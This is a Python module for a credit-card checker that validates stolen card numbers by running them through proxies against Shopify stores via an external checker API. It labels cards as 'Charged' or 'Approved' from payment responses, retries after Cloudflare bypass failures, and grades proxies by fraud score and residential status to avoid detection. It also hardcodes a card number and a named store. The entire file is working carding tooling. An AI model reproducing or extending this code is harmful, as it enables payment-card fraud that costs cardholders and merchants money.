import asyncio
import random

import aiohttp

from config import CHECKER_API_URL
from utils.helpers import is_dead_site_error


# ─── Card Checking ────────────────────────────────────────────────────────────

async def check_card(card: str, site: str, proxy: str) -> dict:
    """Check a single card against a site using the checker API.

    Returns a result dict with keys:
        status   : 'Charged' | 'Approved' | 'Dead' | 'Site Error' | 'Invalid Format'
        message  : raw API response string
        card     : the card string that was checked
        site     : the site used (when available)
        gateway  : gateway name from API
        price    : price from API
        retry    : True if caller should retry with a different site
    """
    try:
        parts = card.split("|")
        if len(parts) != 4:
            return {
                "status": "Invalid Format",
                "message": "Invalid card format",
                "card": card,
            }

        params = {"cc": card, "url": site, "proxy": proxy}
        timeout = aiohttp.ClientTimeout(total=120)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get("Response", "")
        price = raw.get("Price", "-")
        gate = raw.get("Gate", "shopiii")
        status = raw.get("Status", "")

        if is_dead_site_error(response_msg):
            return {
                "status": "Site Error",
                "message": response_msg,
                "card": card,
                "retry": True,
                "gateway": gate,
                "price": price,
            }

        response_lower = response_msg.lower()

        if status == "Charged" or "order completed" in response_lower or "💎" in response_msg:
            return {
                "status": "Charged",
                "message": response_msg,
                "card": card,
                "site": site,
                "gateway": gate,
                "price": price,
            }

        if "cloudflare bypass failed" in response_lower:
            return {
                "status": "Site Error",
                "message": "Cloudflare spotted",
                "card": card,
                "retry": True,
                "gateway": gate,
                "price": price,
            }

        if "thank you" in response_lower or "payment successful" in response_lower:
            return {
                "status": "Charged",
                "message": response_msg,
                "card": card,
                "site": site,
                "gateway": gate,
                "price": price,
            }

        _approved_keywords = (
            "approved", "success",
            "insufficient_funds", "insufficient funds",
            "invalid_cvv", "incorrect_cvv", "invalid_cvc", "incorrect_cvc",
            "invalid cvv", "incorrect cvv", "invalid cvc", "incorrect cvc",
            "incorrect_zip", "incorrect zip",
        )

        if status == "Approved" or any(k in response_lower for k in _approved_keywords):
            return {
                "status": "Approved",
                "message": response_msg,
                "card": card,
                "site": site,
                "gateway": gate,
                "price": price,
            }

        return {
            "status": "Dead",
            "message": response_msg,
            "card": card,
            "site": site,
            "gateway": gate,
            "price": price,
        }

    except asyncio.TimeoutError:
        return {
            "status": "Site Error",
            "message": "Request timeout",
            "card": card,
            "retry": True,
        }

    except Exception as exc:
        error_msg = str(exc)
        if is_dead_site_error(error_msg):
            return {
                "status": "Site Error",
                "message": error_msg,
                "card": card,
                "retry": True,
            }
        return {
            "status": "Dead",
            "message": error_msg,
            "card": card,
            "gateway": "Unknown",
            "price": "-",
        }


async def check_card_with_retry(
    card: str,
    sites: list[str],
    proxy: str,
    max_retries: int = 2,
) -> dict:
    """Attempt to check a card, retrying with a different site on site errors.

    Args:
        card        : card string in ``number|mm|yyyy|cvv`` format
        sites       : list of site URLs to randomly choose from
        proxy       : proxy string in ``ip:port:user:pass`` format
        max_retries : maximum number of site attempts before giving up

    Returns a result dict (see :func:`check_card`).
    """
    if not sites:
        return {
            "status": "Dead",
            "message": "No sites available",
            "card": card,
            "gateway": "Unknown",
            "price": "-",
        }

    if not proxy:
        return {
            "status": "Dead",
            "message": "No proxy configured",
            "card": card,
            "gateway": "Unknown",
            "price": "-",
        }

    last_result = None

    for attempt in range(max_retries):
        site = random.choice(sites)
        result = await check_card(card, site, proxy)

        if not result.get("retry"):
            return result

        last_result = result

        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {
            "status": "Dead",
            "message": f"Site errors: {last_result['message']}",
            "card": card,
            "gateway": last_result.get("gateway", "Unknown"),
            "price": last_result.get("price", "-"),
            "site": "Multiple",
        }

    return {
        "status": "Dead",
        "message": "Max retries exceeded",
        "card": card,
        "gateway": "Unknown",
        "price": "-",
    }


# ─── Site / Proxy Testing ─────────────────────────────────────────────────────

_TEST_CARD = "5154623245618097|03|2032|156"
_TEST_SITE = "https://riverbendhomedev.myshopify.com"


async def test_site(site: str, proxy: str) -> dict:
    """Test whether a site is alive by running a dummy card through the API.

    Returns ``{'site': site, 'status': 'alive' | 'dead'}``.
    """
    try:
        params = {"cc": _TEST_CARD, "site": site, "proxy": proxy}
        timeout = aiohttp.ClientTimeout(total=60)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        if "error" in raw:
            return {"site": site, "status": "dead", "msg": raw.get("error")}

        response_msg = raw.get("Response", "")

        if is_dead_site_error(response_msg):
            return {"site": site, "status": "dead", "msg": response_msg}

        price = raw.get("Price", "N/A")
        return {"site": site, "status": "alive", "msg": response_msg, "price": price}

    except Exception as e:
        return {"site": site, "status": "dead", "msg": str(e)}


import time

def get_proxy_url(proxy_str: str) -> str:
    proxy_str = proxy_str.strip()
    try:
        if "@" in proxy_str:
            auth, hostport = proxy_str.rsplit("@", 1)
            user, password = auth.split(":", 1)
            host, port = hostport.rsplit(":", 1)
            return f"http://{user}:{password}@{host}:{port}"
        else:
            parts = proxy_str.split(":")
            if len(parts) == 4:
                host, port, user, password = parts
                return f"http://{user}:{password}@{host}:{port}"
            elif len(parts) == 2:
                return f"http://{parts[0]}:{parts[1]}"
    except Exception:
        pass
    return None

async def test_proxy(proxy_str: str, timeout: int = 10) -> dict:
    """Full proxy test — IP, country, speed, type, fraud score, and Shopify connectivity"""
    result = {
        "proxy": proxy_str, "status": "dead", "alive": False, "ms": None, "ip": None,
        "country": None, "country_code": None, "isp": None, "type": None,
        "shopify": False, "shopify_ms": None,
        "fraud_score": None, "is_proxy": None, "is_vpn": None,
        "error": None,
    }
    proxy_url = get_proxy_url(proxy_str)
    if not proxy_url:
        result["error"] = "Invalid format"
        return result
    
    # Detect proxy type from URL
    if proxy_url.startswith("socks5"):
        result["type"] = "SOCKS5"
    elif proxy_url.startswith("socks4"):
        result["type"] = "SOCKS4"
    else:
        result["type"] = "HTTP"
    
    try:
        # Step 1: Basic connectivity + IP info
        t0 = time.perf_counter()
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout)) as s:
            async with s.get("http://ip-api.com/json?fields=query,country,countryCode,isp,org,as,hosting", proxy=proxy_url) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["alive"] = True
                    result["status"] = "alive"
                    result["ms"] = round((time.perf_counter() - t0) * 1000)
                    result["ip"] = data.get("query", "?")
                    result["country"] = data.get("country", "?")
                    result["country_code"] = data.get("countryCode", "?")
                    result["isp"] = data.get("isp") or data.get("org") or "?"
                    if data.get("hosting"):
                        result["type"] += " (DC)"
                    else:
                        result["type"] += " (Resi)"
                else:
                    result["error"] = f"HTTP {resp.status}"
                    return result
    except asyncio.TimeoutError:
        result["error"] = "Timeout"
        return result
    except Exception as e:
        result["error"] = str(e)[:40]
        return result
    
    # Step 2: Fraud score check via proxycheck.io (free, no key)
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=6)) as s:
            check_url = f"http://proxycheck.io/v2/{result['ip']}?vpn=1&risk=1&asn=1"
            async with s.get(check_url) as resp:
                if resp.status == 200:
                    fdata = await resp.json()
                    ip_data = fdata.get(result["ip"], {})
                    result["fraud_score"] = ip_data.get("risk", None)
                    result["is_proxy"] = ip_data.get("proxy", "?")
                    result["is_vpn"] = ip_data.get("vpn", "?")
    except Exception:
        pass  # Non-critical, continue without fraud score
    
    # Step 3: Shopify connectivity test
    try:
        t1 = time.perf_counter()
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=8),
            connector=aiohttp.TCPConnector(ssl=False)
        ) as s:
            async with s.get(
                "https://checkout.shopify.com",
                proxy=proxy_url
            ) as resp:
                result["shopify_ms"] = round((time.perf_counter() - t1) * 1000)
                if resp.status in (200, 301, 302, 403, 404):
                    result["shopify"] = True
    except Exception:
        result["shopify"] = False
        result["shopify_ms"] = None
    
    return result
